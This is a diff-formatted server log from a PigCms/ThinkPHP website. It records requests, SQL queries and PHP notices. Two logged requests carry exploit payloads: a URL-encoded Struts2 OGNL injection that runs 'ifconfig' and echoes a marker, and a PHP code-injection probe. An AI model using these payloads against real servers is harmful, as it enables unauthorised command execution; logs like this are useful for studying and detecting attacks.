+INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.077149s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.078125s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.079102s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.079102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.080079s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:26:21+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045898s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.078125s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.079101s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.080078s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.081055s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.081055s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:26:43+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.003907s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045898s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.078125s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.079101s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.080078s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.080078s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002929s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.081054s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000977s ]
+
+[ 2015-08-22T22:26:53+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.043945s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045898s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.033203s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.079101s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081054s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.081054s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.082031s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:26:55+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001953s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.041016s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.041992s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.033203s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.075195s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.075195s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.076172s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.077148s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.078125s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000000s ]
+
+[ 2015-08-22T22:27:03+08:00 ] 121.42.0.38 /?%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27ifconfig%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023%27heimdall181%27%29%27%29%28bla%29%29
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.005860s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.004883s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.012696s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.009765s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.008790s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.003906s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.080078s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.082031s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.036133s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.118164s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.120117s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.121094s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.122070s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.004883s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.123047s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:27:13+08:00 ] 121.42.0.38 /index.php?system=Dash&page=%27);echo(md5(666));//
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001953s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001954s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.042969s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.077149s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.078125s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.079102s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.080078s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003906s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.081055s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000977s ]
+
